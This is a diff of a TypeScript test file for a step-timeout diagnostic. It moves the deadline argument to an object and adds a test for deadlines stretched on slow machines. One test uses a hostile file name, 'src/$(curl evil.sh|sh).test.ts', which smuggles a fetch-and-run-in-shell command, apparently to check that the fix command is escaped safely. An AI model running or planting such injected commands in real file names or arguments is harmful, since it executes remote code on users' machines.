@@ -175,7 +175,7 @@ describe('stepTimeoutFinding', () => {
   test('names the stuck file in the cause, in `at`, in meta — and the fix runs that file', () => {
     const finding = stepTimeoutFinding(
       'unit',
-      480_000,
+      { ms: 480_000 },
       expiry({
         inFlight: [
           { command: PARALLEL, output: `${printed(...FILES)}\n${crash(FILES[1] as string)}` },
@@ -214,7 +214,7 @@ describe('stepTimeoutFinding', () => {
     const file = 'src/my app/a.test.ts';
     const finding = stepTimeoutFinding(
       'unit',
-      1_000,
+      { ms: 1_000 },
       expiry({
         inFlight: [{ command: ['bun', 'test', '--parallel=2', file], output: crash(file) }],
       }),
@@ -227,7 +227,7 @@ describe('stepTimeoutFinding', () => {
     const hostile = 'src/$(curl evil.sh|sh).test.ts';
     const finding = stepTimeoutFinding(
       'unit',
-      1_000,
+      { ms: 1_000 },
       expiry({
         inFlight: [{ command: ['bun', 'test', '--parallel=2', hostile], output: crash(hostile) }],
       }),
@@ -239,7 +239,7 @@ describe('stepTimeoutFinding', () => {
   test('no file named: the run itself did not exit, and the step is the reproduction', () => {
     const finding = stepTimeoutFinding(
       'unit',
-      480_000,
+      { ms: 480_000 },
       expiry({ inFlight: [{ command: PARALLEL, output: printed(...FILES) }] }),
       'x verify',
     );
@@ -263,7 +263,7 @@ describe('stepTimeoutFinding', () => {
     ];
     const finding = stepTimeoutFinding(
       'unit',
-      480_000,
+      { ms: 480_000 },
       {
         killed: [{ pid: 7, command: 'bun test --coverage …' }],
         finished: { runs: 91, slowestMs: 110_000 },
@@ -288,7 +288,7 @@ describe('stepTimeoutFinding', () => {
   test('a run in flight far longer than any that finished is still read as the hang', () => {
     const finding = stepTimeoutFinding(
       'unit',
-      480_000,
+      { ms: 480_000 },
       {
         killed: [],
         finished: { runs: 3, slowestMs: 20_000 },
@@ -306,7 +306,7 @@ describe('stepTimeoutFinding', () => {
   test('a step hung in this process: nothing in flight, and the step is still the reproduction', () => {
     const finding = stepTimeoutFinding(
       'filesize',
-      30,
+      { ms: 30 },
       { killed: [], inFlight: [] },
       'bun run verify',
     );
@@ -317,10 +317,23 @@ describe('stepTimeoutFinding', () => {
     expect(finding.fix).toContain('"stepTimeoutMs": { "filesize": <milliseconds> }');
   });
 
+  test('a deadline stretched to a slow machine says so, and by how much', () => {
+    const finding = stepTimeoutFinding(
+      'manifest',
+      { ms: 750_000, pace: 2.5 },
+      { killed: [], inFlight: [] },
+      'bun run verify',
+    );
+    expect(finding.cause).toStartWith(
+      'step "manifest" did not finish within its 750000 ms deadline (the declared 300000 ms at this machine\'s pace, ×2.5), so it was stopped',
+    );
+    expect(finding.meta).toMatchObject({ deadlineMs: 750_000, pace: 2.5 });
+  });
+
   test('a child that is not a test run is named by its command', () => {
     const finding = stepTimeoutFinding(
       'typecheck',
-      300_000,
+      { ms: 300_000 },
       expiry({
         inFlight: [{ command: ['bunx', 'tsc', '-b', '--pretty', 'false', 'x'], output: '' }],
       }),
@@ -396,7 +409,12 @@ describe('against a real bun test', () => {
         for (let i = 0; i < 2_400 && !(await Bun.file(marker).exists()); i += 1)
           await Bun.sleep(25);
         expect(await Bun.file(marker).exists()).toBe(true);
-        const finding = stepTimeoutFinding('unit', 480_000, await guard.expire(), 'bun run verify');
+        const finding = stepTimeoutFinding(
+          'unit',
+          { ms: 480_000 },
+          await guard.expire(),
+          'bun run verify',
+        );
         await running;
         // The other worker may truthfully still hold a quick file at that instant, so the contract
         // is: the stuck file is named, and nothing is named that a worker could not have held.
